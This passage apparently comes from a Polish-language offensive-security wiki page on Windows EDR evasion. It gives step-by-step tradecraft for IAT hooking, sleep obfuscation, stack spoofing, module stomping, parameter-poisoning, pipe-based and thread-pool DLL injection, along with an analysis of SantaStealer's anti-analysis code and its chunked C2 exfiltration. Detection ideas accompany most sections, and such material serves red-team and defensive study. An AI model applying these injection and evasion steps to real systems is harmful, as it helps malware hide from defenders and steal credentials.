- Zastosuj patch po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loadery, takie jak TitanLdr/AceLdr, pokazują hooking podczas DllMain załadowanego modułu.
- Ogranicz wrappery do minimum i zadbaj o ich zgodność z PIC; właściwe API rozwiąż za pomocą oryginalnej wartości IAT zapisanej przed patchem lub przez LdrGetProcedureAddress.
- Przy PIC stosuj przejścia RW → RX i nie pozostawiaj stron jednocześnie zapisywalnych i wykonywalnych.

Stub do spoofingu stosu wywołań
- Stubsy PIC w stylu Draugr tworzą fałszywy łańcuch wywołań (adresy powrotu wskazujące na nieszkodliwe moduły), a następnie przechodzą do właściwego API.
- Pozwala to ominąć detekcje oczekujące kanonicznych stosów podczas wywołań wrażliwych API z Beacon/BOFs.
- Połącz tę technikę z stack cutting/stack stitching, aby przed prologiem API znaleźć się w oczekiwanych ramkach.

Integracja operacyjna
- Dodaj reflective loader na początku DLL-i post-ex, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL-a.
- Użyj skryptu Aggressor do rejestrowania docelowych API, aby Beacon i BOFs korzystały z tej samej ścieżki evasion bez zmian w kodzie.

Kwestie wykrywania/DFIR
- Integralność IAT: wpisy wskazujące na adresy spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importu.
- Anomalie stosu: adresy powrotu nienależące do załadowanych obrazów; nagłe przejścia do PIC spoza obrazu; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy do IAT w procesie, wczesna aktywność DllMain modyfikująca thunk importu, nieoczekiwane regiony RX tworzone podczas ładowania.
- Omijanie image-load: jeśli hooking dotyczy LoadLibrary*, monitoruj podejrzane ładowania zestawów automation/clr skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy składowe i przykłady
- Reflective loadery wykonujące patching IAT podczas ładowania (np. TitanLdr, AceLdr)
- Hooki maskowania pamięci (np. simplehook) i PIC stosujące stack cutting (stackcutting)
- Stubsy PIC do spoofingu stosu wywołań (np. Draugr)


## Hooking IAT w czasie importu + obfuskacja uśpienia (Crystal Palace/PICO)

### Hooki IAT w czasie importu za pomocą rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik `GetProcAddress` loadera własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **rezydentny PICO** (trwały obiekt PIC), który przetrwa zwolnienie się tymczasowego PIC loadera.
- Udostępnij funkcję `setup_hooks()`, która nadpisze resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy ordinalne i użyj opartego na hashach wyszukiwania hooków, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie wywołaj prawdziwe `GetProcAddress`.
- Zarejestruj cele hooków na etapie linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostanie prawidłowy, ponieważ znajduje się wewnątrz rezydentnego PICO.

Dzięki temu uzyskasz **przekierowanie IAT w czasie importu** bez patchowania sekcji kodu załadowanej DLL-i po załadowaniu.

### Wymuszanie importów, które można hookować, gdy cel używa PEB-walking

Hooki w czasie importu zadziałają tylko wtedy, gdy funkcja faktycznie znajduje się w IAT celu. Jeśli moduł rozwiązuje API przez PEB-walk + hash (bez wpisu importu), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera go obsłużyła:

- Zastąp rozwiązywanie eksportu przez hash (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, np. `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie importu przez reflective loader.

### Obfuskacja uśpienia/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch obfuskacji w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz jako `PAGE_READWRITE` → zaszyfruj RC4 przez `advapi32!SystemFunction032` cały zamapowany obraz → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy etap.

Szczegół operacyjny: dla długich oczekiwań zwracaj „success” (np. `WAIT_OBJECT_0`), aby kod wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami w okresach bezczynności i pozwala uniknąć charakterystycznego wzorca „patchowania `Sleep()`”.

Pomysły na detekcję (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach wielkości obrazu.
- `VirtualProtect` obejmujące duży zakres, po którym następuje niestandardowe przywrócenie uprawnień poszczególnych sekcji.

### Rejestracja CFG w czasie działania dla gadżetów obfuskacji uśpienia

W celach z włączonym CFG pierwszy pośredni skok do gadżetu w środku funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje awarię procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżetu nie ma w metadanych CFG modułu. Aby utrzymać łańcuchy w stylu Ekko/Kraken w zabezpieczonych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy pośredni cel używany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- Dla adresów w załadowanych obrazach (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **cały rozmiar obrazu**.
- Dla ręcznie mapowanych regionów/PIC/stomped użyj **bazy alokacji** i rozmiaru alokacji.
- Oznacz nie tylko gadżet dyspozycyjny, ale też eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe wait/event) oraz wszelkie wykonywalne sekcje kontrolowane przez atakującego, które będą pośrednimi celami.

Dzięki temu łańcuchy uśpienia w stylu ROP/JOP przestają „działać tylko w procesach bez CFG” i stają się wielokrotnego użytku w `explorer.exe`, przeglądarkach, `svchost.exe` i innych procesach skompilowanych z `/guard:cf`.

### Spoofing stosu bezpieczny dla CET w uśpionych wątkach

Pełna podmiana `CONTEXT` jest głośna i może powodować problemy w systemach CET Shadow Stack, ponieważ spoofowany `Rip` musi nadal zgadzać się ze sprzętowym shadow stackiem. Bezpieczniejszy wzorzec maskowania uśpienia wygląda tak:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stosu `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Utwórz kopię zapasową rzeczywistego TEB/TIB bieżącego wątku.
- Przechwyć rzeczywisty kontekst uśpionego wątku za pomocą `GetThreadContext`.
- Skopiuj **wyłącznie** rzeczywisty `Rip` do spoofowanego kontekstu, pozostawiając spoofowane `Rsp`/stan stosu bez zmian.
- Na czas uśpienia skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby stack walkery rozwijały stos w prawidłowym zakresie.
- Po zakończeniu oczekiwania przywróć oryginalny TIB i kontekst wątku.

Pozwala to zachować wskaźnik instrukcji zgodny z CET, jednocześnie wprowadzając w błąd stack walkery EDR, które ufają metadanym stosu TEB przy weryfikacji rozwijania stosu.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch kolejki timerów zbyt mocno rzuca się w oczy, tę samą sekwencję uśpienia, szyfrowania, spoofingu i przywracania można wykonać z użyciem kolejkowanych APC wstrzymanego wątku pomocniczego:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako punktem wejścia.
- Zakolejkuj przygotowane ramki `CONTEXT`/APC za pomocą `NtQueueApcThread` i opróżnij kolejkę przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na stercie, a nie na stosie wątku pomocniczego, aby uniknąć wyczerpania domyślnego stosu wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować działanie.
- Wstrzymaj główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → przywrócenie → `NtResumeThread`), aby skrócić okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stos.

Ta metoda zastępuje sygnaturę `CreateTimerQueueTimer` + `NtContinue` sygnaturą wątku pomocniczego/APC, zachowując te same cele maskowania RC4 i spoofingu stosu.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed uśpieniem, oczekiwaniem lub dispatch APC.
- `GetThreadContext`/`SetThreadContext` używane w połączeniu z `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stosu TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread` prowadzące pośrednio do `SystemFunction032`, `VirtualProtect` lub funkcji pomocniczych przywracających uprawnienia sekcji.
- Wielokrotne użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako punktów przestawienia dispatch w podpisanych modułach.


## Precyzyjne module stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL-a już zamapowanego w procesie docelowym**, zamiast alokować oczywistą prywatną pamięć wykonywalną lub ładować nowy, ofiarny DLL. Celem nadpisania powinien być **załadowany obraz oparty na pliku na dysku**, którego obszar kodu może pomieścić payload bez uszkadzania ścieżek kodu nadal potrzebnych procesowi.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwny stomping popularnych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodny: DLL może nie być załadowany w zdalnym procesie, a zbyt mały obszar kodu spowoduje awarię procesu. Bardziej niezawodny przebieg pracy:

1. Wylicz moduły procesu docelowego i pozostaw **listę dozwolonych nazw** obejmującą już załadowane DLL-e.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj DLL-e na dysku i porównaj **`Misc_VirtualSize` sekcji `.text` PE** z rozmiarem payloadu. Ma to większe znaczenie niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zamapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset nadpisania.
5. Oblicz **promień rażenia**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone za nią w pamięci.

Typowe narzędzia pomocnicze do rekonesansu/wyboru celu spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Prefer DLLs **already loaded** in zdalnym procesie, aby uniknąć telemetrii `LoadLibrary`/nieoczekiwanych załadowań obrazów.
- Preferuj eksporty, które są rzadko wykonywane przez aplikację docelową; w przeciwnym razie zwykłe ścieżki kodu mogą trafić na nadpisane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode z literału tekstowego na **inicjalizator tablicy bajtów/w nawiasach klamrowych**, aby cały bufor był poprawnie reprezentowany w kodzie injectora.

Pomysły na wykrywanie
- Zdalne zapisy do stron wykonywalnych wspartych obrazem (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast częściej spotykanych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie są już zgodne z plikiem źródłowym na dysku.
- Zdalne wątki lub przestawienia kontekstu, które rozpoczynają wykonywanie wewnątrz eksportu z legalnej DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` skierowane do stron `.text` DLL, po których następuje utworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **process-injection / EDR-evasion**, która omija klasyczną ścieżkę zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już działającego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatrucie, kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktyczne ograniczenia nośników:

- `lpCommandLine` musi wskazywać **pamięć z możliwością zapisu** dla `CreateProcessW` i jest ograniczony do **32 767 znaków Unicode**, łącznie ze znakiem null.
- `lpEnvironment` musi być blokiem środowiska Unicode składającym się z kolejnych ciągów `NAME=VALUE\0`, zakończonych dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilną, udokumentowaną umowę.

Dzięki temu zwykłe tworzenie procesu staje się **prymitywem transferu payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi i pozwala Windows wykonać kopiowanie między procesami.

### Przepływ zdalnego wyszukiwania bez zdalnych API zapisu

Po utworzeniu procesu potomnego odszukaj skopiowany bufor za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podążaj za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przepływ:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów ma zwykle uprawnienia `RW`, a nie jest wykonywalny. Typowy łańcuch P3 wygląda tak:

1. Utwórz proces w zwykły sposób (nie jako wstrzymany)
2. Nadaj wybranej stronie parametrów uprawnienia do wykonywania za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Użyj ponownie uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisz `RIP`)

W przeciwieństwie do klasycznych metod przejmowania wątku, nie wymaga to użycia `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio na zwróconym uchwycie głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem wstrzykiwania:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie bajtu null i etapowy shellcode

Wszystkie trzy nośniki to **dane tekstowe lub podobne do tekstowych**, więc surowy payload zawierający `0x00` zostaje obcięty podczas przesyłania. Praktycznym obejściem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie wykonywania, a następnie ładuje dowolny drugi etap.

Prosty wzorzec polega na syntezie stałych z użyciem XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

To pozwala pierwszemu etapowi tworzyć na stosie ciągi znaków, argumenty API, ścieżki DLL lub loader shellcode drugiego etapu bez umieszczania bajtów null w przesyłanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg znaków/bufor na stosie procesu docelowego
- zarezerwować **32-bajtowy obszar shadow space dla x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe lub wskaźniki względne względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do obszaru alokacji `PAGE_READWRITE`, zmienić jego ochronę na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i wykonać skok do niego, unikając bezpośredniej alokacji RWX.

### Pomysły na wykrywanie

Dobre możliwości wykrywania wymienione przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` ustawiające **strony parametrów procesu jako wykonywalne**
- zmiana ochrony, po której następuje `SetThreadContext` / `NtSetContextThread`
- zdalne odczyty `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sztuczka transferu między procesami**, a nie samodzielny mechanizm wykonywania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Iniekcja przez potok STDIN konsoli

Interaktywny proces potomny konsoli może również służyć jako **mechanizm transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do potoku i wysyła znacznik, po którym następuje shellcode. Gdy program konsolowy odczyta dane do swojej prywatnej pamięci, injector odnajduje ten bufor, nadaje mu uprawnienia do wykonywania i przekierowuje do niego wątek procesu potomnego. Pozwala to uniknąć `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to iniekcja do procesu, a nie ogólna metoda obejścia EDR.<sup>[[41]](#references)</sup>

Mimo określenia „named-pipe” implementacja referencyjna wywołuje `CreatePipe`, które tworzy **potok anonimowy**. Windows wewnętrznie implementuje potoki anonimowe za pomocą obiektów potoków o unikatowych nazwach, ale PoC ani nie wybiera ścieżki `\\.\pipe\<name>`, ani nie wywołuje `CreateNamedPipe`. Tworzy uchwyty dziedziczone z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego ten PoC uruchamia dostarczony plik wykonywalny konsoli; nie podłącza potoku do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Przebieg opisany w dokumentacji

Implementacja wykorzystuje następujący łańcuch:<sup>[[41]](#references)</sup>

1. Utwórz pary potoków anonimowych dla `STDIN` i `STDOUT` procesu potomnego. Wyłącz dziedziczenie dla dwóch uchwytów po stronie procesu nadrzędnego i zamknij duplikaty uchwytów po stronie procesu potomnego w procesie nadrzędnym po utworzeniu procesu.
2. Uruchom interaktywny plik wykonywalny, taki jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane uchwyty standardowe.
3. Wyślij całą tablicę binarną `rawData` za pomocą `WriteFile` przez uchwyt `STDIN` po stronie procesu nadrzędnego. Program konsolowy przetwarza bajty i pozostawia kopię w jednym ze swoich prywatnych, zatwierdzonych obszarów pamięci.
4. Przejdź przez przestrzeń adresową procesu potomnego za pomocą `VirtualQueryEx`, odczytaj potencjalne obszary `MEM_PRIVATE` za pomocą `ReadProcessMemory` i wyszukaj znacznik na początku `rawData`.
5. Zmień ochronę odnalezionego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikuj główny wątek, wstrzymaj go, ustaw `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread` i wznów jego działanie.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest specyficzna dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się od 25-bajtowego znacznika, więc bajty wykonywalne zaczynają się pod offsetem szesnastkowym `0x19`. Przy zastępowaniu payloadu zachowaj ten układ albo odpowiednio zaktualizuj znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają też `0x0A`, `0x0D` i `0x1A` jako złe znaki. Ten workflow nie zmienia tokenu ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Wzorce kompilacji małych natywnych helperów i payloadów opisano w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Wstrzykiwanie DLL przez callback puli wątków bez shellcode (DLLParty)

DLLParty adaptuje wstrzykiwanie do puli wątków w stylu PoolParty, tak aby istniejący worker procesu docelowego wywołał `LoadLibraryA`, zamiast wykonywać wstrzyknięty stub callbacku. Jego prymitywem dyspozycji jest ukończenie `TP_DIRECT` umieszczone w kolejce portu ukończenia I/O puli procesu docelowego. Nie omija to uprawnień procesu: PoC wywołuje `OpenProcess(PROCESS_ALL_ACCESS)` i wymaga pamięci procesu docelowego z prawami odczytu i zapisu oraz uchwytów worker-factory i portu ukończenia, które można zduplikować.<sup>[[46]](#references)[[47]](#references)</sup>

W systemie Windows x64 worker przekazuje wskaźnik do opartego na stosie `TP_CALLBACK_INSTANCE` w `RCX`, czyli pierwszym argumencie callbacku. `LoadLibraryA` interpretuje ten sam wskaźnik jako `LPCSTR`. Na testowanej ścieżce `TppWorkerThread` tworzy wskaźnik pod `RSP+0x178`, a pierwszy zwykły zapis do tego obiektu wykonuje pod `RSP+0x1d0`. Zakończona znakiem null ścieżka do DLL, która mieści się w tym prefiksie o długości 0x58 bajtów, może więc znaleźć się na początku instancji i nie zostanie nadpisana przed dyspozycją. To obserwacja dotycząca konkretnej kompilacji, a nie udokumentowana gwarancja ABI systemu Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Referencyjny workflow:<sup>[[46]](#references)[[47]](#references)</sup>

1. Wylicz uchwyty procesu docelowego za pomocą `NtQuerySystemInformation(SystemHandleInformation)` i zidentyfikuj `TpWorkerFactory`, odpytując typy obiektów. Zduplikuj uchwyt worker-factory i pobierz `WorkerFactoryBasicInformation`; `StartParameter` wskazuje zdalny `TP_POOL`. Pomiń fabryki, dla których `TotalWorkerCount == 0`.
2. Odczytaj `TP_POOL.CompletionPort` i przejdź przez prywatną listę workerów puli. W testowanej kompilacji Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) jej głowa znajduje się pod `pool+0x60`; każde łącze znajduje się pod `worker+0x10`, więc slot instancji callbacku pod `worker+0x38` odpowiada `link+0x28`. PoC sprawdza wyrównanie wskaźników, wzajemność łączy, przynależność do puli, niezerowe identyfikatory wątków, powtórzone węzły i stabilność głowy listy.
3. Zapisz ścieżkę do DLL we **wszystkich** odzyskanych slotach workerów, ponieważ umieszczone w kolejce ukończenie może zostać pobrane przez dowolnego workera. Umieść `TP_DIRECT` z `Callback = LoadLibraryA` w zapisywalnej pamięci procesu docelowego. PoC używa `last_slot-0x500` na stosie workera zamiast `VirtualAllocEx`; ten offset jest eksperymentalny i nie może kolidować z aktywnymi danymi stosu.
4. Zduplikuj uchwyt portu ukończenia procesu docelowego i wywołaj `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adres zdalnego `TP_DIRECT` jest kluczem ukończenia. Istniejący worker wywoła wtedy `LoadLibraryA` z nadpisanym wskaźnikiem instancji callbacku, ładując DLL dostępną dla procesu docelowego.

PoC przyjmuje PID procesu docelowego (`DLLParty.exe <target_pid>`) i używa zahardkodowanej ścieżki do DLL w `DLLParty.cpp`; przed kompilacją pliku wykonywalnego x64 ustaw ścieżkę dostępną dla procesu docelowego. Używa też adresu `LoadLibraryA` z własnego procesu jako zdalnego callbacku, zakładając więc, że ten adres jest prawidłowy w procesie docelowym. Kod nie sprawdza, czy ścieżka mieści się w prefiksie o długości 0x58 bajtów ani czy podczas przechodzenia po workerach znaleziono slot, zanim zostanie zaindeksowany ostatni element. Ponownie zweryfikuj prywatne offsety, układ stosu i dostępną przestrzeń do zapisu dla docelowej kompilacji. Pominięcie `CreateRemoteThreadEx`, shellcode i `VirtualAllocEx` nie eliminuje zapisów między procesami ani telemetrii ładowania DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktyki SantaStealer w zakresie unikania wykrycia bez plików i kradzieży poświadczeń

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne info-stealery łączą omijanie AV, techniki antyanalizy i dostęp do poświadczeń w jednym workflow.<sup>[[24]](#references)</sup>

### Ograniczenie według układu klawiatury i opóźnienie w sandboxie

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli zostanie znaleziony układ cyryliczny, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem modułów kradnących dane, dzięki czemu nie uruchamia się w wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt przydatny do wyszukiwania.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, oblicza dla każdej nazwy niestandardową sumę kontrolną z funkcją mieszającą i porównuje ją z wbudowanymi listami blokowanych nazw debuggerów/sandboxów; ponownie oblicza sumę kontrolną dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas od uruchomienia), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, i sprawdza czas wokół opóźnień, by wykryć wykonywanie krokowe. Każde wykrycie przerywa działanie przed uruchomieniem modułów.

### Bezplikowy helper + podwójne ładowanie refleksyjne ChaCha20

- Główna biblioteka DLL/plik EXE zawiera helper do obsługi danych logowania Chromium, który jest zapisywany na dysku albo ręcznie mapowany w pamięci; w trybie bezplikowym samodzielnie rozwiązuje importy i relokacje, dzięki czemu nie powstają żadne pliki helpera.
- Helper przechowuje bibliotekę DLL drugiego etapu, dwukrotnie zaszyfrowaną algorytmem ChaCha20 (dwa 32-bajtowe klucze i 12-bajtowe nonce). Po obu etapach odszyfrowywania ładuje refleksyjnie blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, wywodzące się z projektu [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator używają bezpośrednich wywołań systemowych i refleksyjnego process hollowing, aby wstrzyknąć kod do działającej przeglądarki Chromium, przejąć klucze AppBound Encryption i odszyfrować hasła/pliki cookie/dane kart kredytowych bezpośrednio z baz SQLite, pomimo zabezpieczeń ABE.

### Modułowe zbieranie danych w pamięci i eksfiltracja HTTP w częściach

- `create_memory_based_log` przechodzi przez globalną tabelę wskaźników funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarek itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i po około 45 sekundach oczekiwania na zakończenie zgłasza liczbę plików.
- Po zakończeniu wszystkie dane są archiwizowane przy użyciu statycznie dołączonej biblioteki `miniz` jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` czeka 15 sekund i przesyła archiwum w częściach po 10 MB za pomocą HTTP POST do `http://<C2>:6767/upload`, podszywając się pod granicę `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Do każdej części dodawane są nagłówki `User-Agent: upload`, `auth: <build_id>` i opcjonalnie `w: <campaign_tag>`, a w ostatniej części umieszczane jest `complete: true`, aby C2 wiedział, że scalanie zostało zakończone.

## References

- [1] [Zaawansowane techniki unikania wykrycia: precyzyjne podmienianie modułów](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Stosy wywołań: koniec taryfy ulgowej dla malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentacja](https://tradecraftgarden.org/docs.html)
